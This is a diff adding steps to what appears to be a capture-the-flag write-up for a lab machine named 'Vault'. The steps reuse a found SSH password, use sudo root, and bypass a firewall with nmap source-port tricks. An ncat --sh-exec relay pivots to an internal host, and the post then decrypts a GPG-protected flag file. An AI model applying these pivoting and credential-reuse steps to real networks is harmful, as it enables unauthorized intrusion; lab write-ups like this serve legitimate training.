@@ -172,6 +172,12 @@ Firewall - 192.168.122.5
 The Vault - x
 {% endhighlight %}
 
+Besides, in"keys", we can find a simple text.
+{% highlight shell %}
+dave@ubuntu:~/Desktop$ cat key 
+itscominghome
+{% endhighlight %}
+
 We can execute nmap scanning for these servers by using <a href="https://github.com/rofl0r/proxychains-ng">Proxychains</a>.<br>
 At first, add some settings in "/etc/proxychains.conf"
 {% highlight shell %}
@@ -271,6 +277,18 @@ dave
 dav3gerous567
 {% endhighlight %}
 
+This is a credential which we can access "DNS" with ssh.
+{% highlight shell %}
+dave@ubuntu:~$ ssh dave@192.168.122.4
+dave@192.168.122.4's password: # dav3gerous567
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
+
+~~~
+
+Last login: Sat Apr  6 10:28:23 2019 from 192.168.122.1
+dave@DNS:~$
+{% endhighlight %}
+
 By following command, we can figure out that we can execute any command as root.
 {% highlight shell %}
 dave@DNS:/home$ sudo -l
@@ -295,3 +313,148 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 {% endhighlight %}
 
+If we try to find this IP address in other place, we can find "auth.log".<br>
+This looks like trying to execute nmap from port -4444.
+{% highlight shell %}
+root@DNS:/var/log# grep "192.168.5.2" -rl /var/log 2>/dev/null
+/var/log/auth.log
+/var/log/btmp
+
+root@DNS:/var/log# cat auth.log | grep -a "192.168.5.2"
+
+~~~
+
+Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
+Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
+Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
+{% endhighlight %}
+
+If we execute these command, we can see unknown service is running on port 987
+{% highlight shell %}
+root@DNS:~# nmap 192.168.5.2 --source-port=4444
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-06 22:50 BST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for Vault (192.168.5.2)
+Host is up (0.0023s latency).
+Not shown: 999 closed ports
+PORT    STATE SERVICE
+987/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 25.84 seconds
+{% endhighlight %}
+
+If we don't specify the option "--source-port=4444", we don't see any result.
+{% highlight shell %}
+root@DNS:~# nmap 192.168.5.2
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-06 22:53 BST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds
+{% endhighlight %}
+
+By running nc from DNS, we can figure out that service is ssh
+{% highlight shell %}
+root@DNS:~# nc 192.168.5.2 987 -p 4444
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+{% endhighlight %}
+
+This means, we have to connect ssh on port 987 from port 4444.<br>
+We need following command to achieve this purpose.
+{% highlight shell %}
+root@DNS:~# ncat -l 1234 --sh-exec "ncat -p 4444 192.168.5.2 987"
+{% endhighlight %}
+
+We can confirm that we opened port 1234 on localhost by netstat
+{% highlight shell %}
+root@DNS:~# netstat -nlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      14274/ncat      
+{% endhighlight%}
+
+By following command, we can connect to VM "Vault".
+{% highlight shell %}
+root@DNS:~# ssh dave@127.0.0.1 -p 1234
+dave@127.0.0.1's password: 
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
+
+~~~
+
+Last login: Sat Apr  6 12:36:57 2019 from 192.168.122.4
+dave@vault:~$ 
+{% endhighlight %}
+
+In the home directory of dave, we can find a gyg encrypted file "root.txt.png".
+{% highlight shell %}
+dave@vault:~$ ls -l
+total 4
+-rw-rw-r-- 1 dave dave 629 Sep  3  2018 root.txt.gpg
+
+dave@vault:~$ file root.txt.gpg
+root.txt.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .
+{% endhighlight %}
+
+It seems like we need a secret key to encrypt this file.
+{% highlight shell %}
+dave@vault:~$ gpg -d root.txt.gpg
+gpg: directory `/home/dave/.gnupg' created
+gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
+gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
+gpg: keyring `/home/dave/.gnupg/secring.gpg' created
+gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
+gpg: encrypted with RSA key, ID D1EB1F03
+gpg: decryption failed: secret key not available
+{% endhighlight %}
+
+We need a secret key file for gpg file. We can find it on VM "ubuntu" by command "gpg --list-secret-keys".
+{% highlight shell %}
+dave@ubuntu:~$ gpg --list-secret-keys
+/home/dave/.gnupg/secring.gpg
+-----------------------------
+sec   4096R/0FDFBFE4 2018-07-24
+uid                  david <dave@david.com>
+ssb   4096R/D1EB1F03 2018-07-24
+{% endhighlight %}
+
+Copy the "root.txt.gpg" to VM "ubuntu".<br>
+{% highlight shell %}
+# On vault
+dave@vault:~$ base32 root.txt.gpg
+QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHD
+LIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJB
+GMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55
+AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRG
+VEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOE
+OPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFE
+CKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3
+AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJI
+UWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTD
+ZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ
+6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36
+G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE274
+64GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBK
+TTAX3UIRVNBQMYRI7XY=
+
+# On ubuntu
+dave@ubuntu:~$ echo "QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=" > root_txt.gpg
+
+dave@ubuntu:~$ base32 -d root_txt.gpg > root.txt.gpg
+{% endhighlight %}
+
+We can decrypt root.txt.gpg by key "itscominghome" in the same directory.
+{% highlight shell %}
+dave@ubuntu:~$ cat Desktop/key 
+itscominghome
+
+dave@ubuntu:~$ gpg -d root.txt.gpg 
+
+You need a passphrase to unlock the secret key for
+user: "david <dave@david.com>"
+4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)
+
+gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
+      "david <dave@david.com>"
+ca468370b91d1f5906e31093d9bfe819
+{% endhighlight %}
